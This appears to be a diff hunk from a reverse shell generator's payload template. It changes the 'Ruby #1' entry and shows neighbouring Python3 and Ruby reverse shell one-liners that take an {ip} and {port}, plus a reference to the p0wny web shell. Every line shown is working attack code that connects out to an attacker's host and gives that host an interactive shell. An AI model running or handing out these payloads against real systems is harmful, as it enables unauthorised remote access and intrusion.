@@ -200,7 +200,7 @@ echo '<h1>p0wny@shell:~#</h1>';
 
   "Python3 shortest": `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`,
 
-  "Ruby #1": `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+  "Ruby #1": `ruby -rsocket -e 'c=TCPSocket.new("{ip}",{port});$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh -i"'`,
 
   "Ruby no sh": `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/)? (Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}})}}'`,
 
